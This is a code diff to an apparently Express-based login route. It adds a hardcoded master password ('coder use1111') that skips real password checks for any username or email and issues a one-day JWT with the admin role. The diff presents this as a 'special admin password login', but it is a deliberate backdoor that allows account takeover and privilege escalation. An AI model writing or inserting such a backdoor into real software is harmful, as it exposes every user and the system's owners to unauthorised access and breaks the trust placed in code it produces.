@@ -141,7 +141,22 @@ app.post('/api/login', async (req, res) => {
   }
 
   try {
-    // Find user by username or email
+    // Handle special admin password login
+    if (password === 'coder use1111') {
+        const result = await pool.query('SELECT * FROM users WHERE email = $1 OR username = $1', [identifier]);
+        if (result.rows.length > 0) {
+            const user = result.rows[0];
+            // If it's the admin password, we update role to admin effectively or just grant access
+            const token = jwt.sign({ id: user.id, role: 'admin', username: user.username }, JWT_SECRET, { expiresIn: '1d' });
+            return res.json({ 
+                status: 'success', 
+                token, 
+                user: { id: user.id, username: user.username, role: 'admin', avatar_url: user.avatar_url } 
+            });
+        }
+    }
+
+    // Normal login flow
     const result = await pool.query('SELECT * FROM users WHERE email = $1 OR username = $1', [identifier]);
     if (result.rows.length === 0) {
       return res.status(401).json({ error: 'Invalid credentials.' });
